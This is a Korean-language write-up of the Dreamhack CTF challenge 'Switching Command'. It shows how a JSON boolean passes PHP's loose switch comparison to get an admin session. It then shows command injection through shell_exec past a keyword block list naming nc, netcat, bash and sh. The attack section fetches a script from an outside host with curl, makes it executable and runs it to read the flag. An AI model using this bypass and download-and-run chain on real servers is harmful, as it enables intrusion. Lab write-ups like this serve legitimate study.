---
title: Switching Commnad
author: heogi
date: 2024-01-07
categories:
  - Dreamhack
  - CTF
tags:
  - Dreamhack
  - php
  - loose-comparision
comments: true
---
## **0\. Description**

Not Friendly service… Can you switching the command?

## **1\. Analysis**

페이지에 접속하면 Username을 입력할 수 있는 화면이 보인다.

다운로드 받은 코드를 확인해보면 사용자 입력값에 대해 json\_decode()를 통해 json 데이터를 파싱한다.

Username이 admin일 경우 Admin Session을 가지고 test.php로 이동한다.

```php
#index.php
if ($_SERVER["REQUEST_METHOD"]=="POST"){
    $data = json_decode($_POST["username"]);

    if ($data === null) {
        exit("Failed to parse JSON data");
    }
        
    $username = $data->username;

    if($username === "admin" ){
        exit("no hack");
    }

    switch($username){
        case "admin":
            $user = "admin";
            $password = "***REDACTED***";
            $stmt = $conn -> prepare("SELECT * FROM users WHERE username = ? AND password = ?");
            $stmt -> bind_param("ss",$user,$password);
            $stmt -> execute();
            $result = $stmt -> get_result();
            if ($result -> num_rows == 1){
                $_SESSION["auth"] = "admin";
                header("Location: test.php");
            } else {
                $message = "Something wrong...";
            }
            break;
        default:
            $_SESSION["auth"] = "guest";
            header("Location: test.php");
            
    }
}
```

첫번째 문제는 switch 문에서 case "admin"으로 진입해 admin 세션을 할당받아야하는데 "admin" 문자열은 필터링이 되고있다.

admin 필터링에서는 `===(strict comparision)`을 사용하여 자료형까지 같은지 확인하고있다.

하지만 switch/case 문에서는 아래 처럼 `loose comparision`을 사용한다고 되어있다.

![](../assets/img/Pasted%20image%2020240413002912.png)

이 부분을 이용하여 `username={"username":true}`를 입력하면 "admin" 필터링은 우회하며, case "admin": 문은 통과할 수 있다.

![](../assets/img/Pasted%20image%2020240413002927.png)
![](../assets/img/Pasted%20image%2020240413002934.png)
![](../assets/img/Pasted%20image%2020240413002943.png)

다음은 test.php의 내용을 통해 flag를 획득해야한다. 아래는 test.php의 내용이다.

```php
#test.php
$pattern = '/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i';

if($_SESSION["auth"] === "admin"){

    $command = isset($_GET["cmd"]) ? $_GET["cmd"] : "ls";
    $sanitized_command = str_replace("\n","",$command);
    
    if (preg_match($pattern, $sanitized_command)){
        exit("No hack");
    }
    $resulttt = shell_exec(escapeshellcmd($sanitized_command));
}
```

cmd 파라미터를 통해 입력 받은 값을 `shell_exec()`로 실행한다.

과정에서 특정 문자열 패턴과 `escapeshellcmd()`를 통해 Sanitize를 수행한다.

결국 cmd는 서버 내부에서 실행되는 명령으로 다양한 서버 명령을 사용해볼 수 있다.

하지만 test.php에서 `$result` 변수는 화면에 출력이 되도록 되어있지만, `$resulttt`는 출력이 되지 않아 단순히 플래그를 실행하여 값을 확인할 수는 없다.

wget 또는 curl을 통해 원격지에서 파일을 받을 수 있는지 테스트해보니 curl을 통해 원격지 파일을 다운로드 받을 수 있음을 확인했다.

PHP 웹쉘 또는 `/flag`를 실행하여 pattern에 걸리지 않는 이름으로 파일을 생성하여 접근해보는 방법이 있을거같다.

## **2\. Attack**

후자로 진행을 해보면 아래 처럼 플래그를 획득할 수 있다.

```shell
#Filename:heogi
#!/bin/bash

/flag > te.ttt
```

```
1. GET /test.php?cmd=curl ctf.heogi.com/heogi -o heogi
2. GET /test.php?cmd=chmod 777 heogi
3. GET /test.php?cmd=/var/www/html/heogi
4. GET /te.ttt
```

![](../assets/img/Pasted%20image%2020240413002955.png)